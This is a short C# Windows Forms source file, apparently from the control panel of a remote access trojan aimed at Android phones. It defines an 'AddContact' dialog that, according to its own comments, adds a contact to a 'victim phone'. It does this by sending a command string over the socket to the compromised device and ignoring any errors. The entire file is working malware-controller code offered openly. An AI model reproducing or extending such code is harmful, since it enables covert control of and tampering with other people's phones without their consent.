using System;
using System.Net.Sockets;
using System.Windows.Forms;

namespace Server.Views
{
    /// <summary>
    /// Adds a new contact to victim phone number
    /// </summary>
    public partial class AddContact : Form
    {
        readonly Socket socket;

        /// <summary>
        /// Creates a new instance of <see cref="AddContact"/> class
        /// </summary>
        /// <param name="socket">Socket that connect the client to the server</param>
        public AddContact(Socket socket)
        {
            InitializeComponent();
            this.socket = socket;
        }

        /// <summary>
        /// Handles the event of adding a new contact to victim mobile phone
        /// </summary>
        /// <param name="sender"><see cref="AddContact"/> form</param>
        /// <param name="e"><see cref="EventArgs"/></param>
        private void OnAddContact(object sender, EventArgs e)
        {
            try
            {
                MainWindow.GoToOurSocket("REHBERISIM", $"[VERI]{numberText.Text}={nameText.Text}=[VERI][0x09]", socket);
            }
            catch (Exception) { }
            Close();
        }
    }
}